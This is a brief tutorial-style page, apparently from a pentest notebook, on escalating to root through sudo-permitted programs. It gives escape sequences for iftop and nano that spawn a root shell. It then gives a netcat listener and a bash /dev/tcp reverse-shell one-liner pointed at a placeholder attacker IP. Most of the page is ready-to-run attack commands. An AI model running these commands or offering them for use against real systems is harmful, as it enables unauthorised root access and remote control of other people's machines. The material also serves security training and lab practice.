# shell escaping

start to know which process run with sudo privilege `sudo -l`

![image.png](<../../../.gitbook/assets/image (1) (1) (1) (1).png>)

we will exploit all service

***

### Iftop

<figure><img src="../../../.gitbook/assets/image 1 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
sudo /usr/sbin/iftop
!/bin/sh
```

<figure><img src="../../../.gitbook/assets/image 2 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

### awk

<figure><img src="../../../.gitbook/assets/image 3 (1).png" alt=""><figcaption></figcaption></figure>

***

> may command line not suitable when as a root by nano service so let’s try to take a reverse shell

### nano

<figure><img src="../../../.gitbook/assets/image 4 (1).png" alt=""><figcaption></figcaption></figure>

```bash
sudo nano
ctrl+R
ctrl+x
reset; sh 1>&0 2>&0
```

which open a root shell but it’s blind which u can see the result only so let’s take a reverse shell on our machine

```bash
# attacker machine
nc -nlvp 5253
```

```bash
# victim
bash -i >& /dev/tcp/AttackerIP/5253 0>&1
```

<figure><img src="../../../.gitbook/assets/image 5 (1).png" alt=""><figcaption></figcaption></figure>
